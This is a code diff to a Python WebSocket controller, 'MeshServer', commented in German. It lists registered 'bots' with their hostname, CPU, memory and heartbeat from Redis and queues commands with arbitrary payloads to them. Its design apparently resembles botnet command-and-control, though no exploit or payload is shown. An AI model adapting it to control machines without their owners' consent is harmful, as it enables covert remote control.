@@ -97,41 +97,53 @@ class MeshServer:
                 data = json.loads(msg)
 
                 if data.get("type") == "command":
+                    action = data["action"]
                     task_id = data.get("task_id", f"task_{int(time.time())}")
-                    command = {
-                        "task_id": task_id,
-                        "action": data["action"],
-                        "target": data.get("target", "all"),
-                        "payload": data.get("payload")
-                    }
 
-                    if data["action"] == "list":
-                        bots = [{
-                            "bot_id": info["bot_id"],
-                            "hostname": info.get("hostname", "unknown"),
-                            "status": info["status"],
-                            "last_seen_sec": int(time.time() - info["last_seen"])
-                        } for info in self.clients.values()]
+                    if action == "list":
+                        # NEU: Aus Redis lesen statt nur self.clients
+                        r = await self.get_redis()
+                        bot_ids = await r.smembers("active_bots")
+
+                        bots = []
+                        for bid in bot_ids:
+                            info_raw = await r.get(f"bot:{bid}:info")
+                            last_heartbeat = await r.get(f"bot:{bid}:heartbeat")
+
+                            if info_raw:
+                                try:
+                                    info = json.loads(info_raw)
+                                    last_seen = int(time.time() - float(last_heartbeat or 0))
+                                    bots.append({
+                                        "bot_id": bid,
+                                        "hostname": info.get("hostname", "unknown"),
+                                        "status": "online" if last_seen < 60 else "offline",
+                                        "last_seen_sec": last_seen,
+                                        "cpu": info.get("cpu"),
+                                        "memory_gb": info.get("memory_gb")
+                                    })
+                                except:
+                                    pass
 
                         await ws.send(json.dumps({
                             "type": "result",
                             "data": {"bots": bots, "count": len(bots)}
                         }))
+
                     else:
-                        # Task an Redis Queue
+                        # Normale Tasks in Redis Queue
+                        command = {
+                            "task_id": task_id,
+                            "action": action,
+                            "target": data.get("target", "all"),
+                            "payload": data.get("payload")
+                        }
                         sent = await self.broadcast_task(command, data.get("target", "all"))
+
                         await ws.send(json.dumps({
                             "type": "info",
-                            "message": f"Task {task_id} an {sent} Client(s) queued."
+                            "message": f"Task {task_id} an {sent} Bot(s) gesendet."
                         }))
-
-                elif data.get("type") == "get_result":
-                    r = await self.get_redis()
-                    result_json = await r.lpop(f"mesh:results:{data['task_id']}")
-                    if result_json:
-                        await ws.send(result_json)
-                    else:
-                        await ws.send(json.dumps({"type": "info", "message": "Result not ready yet"}))
 
         except Exception as e:
             logging.error(f"Controller connection error: {e}")
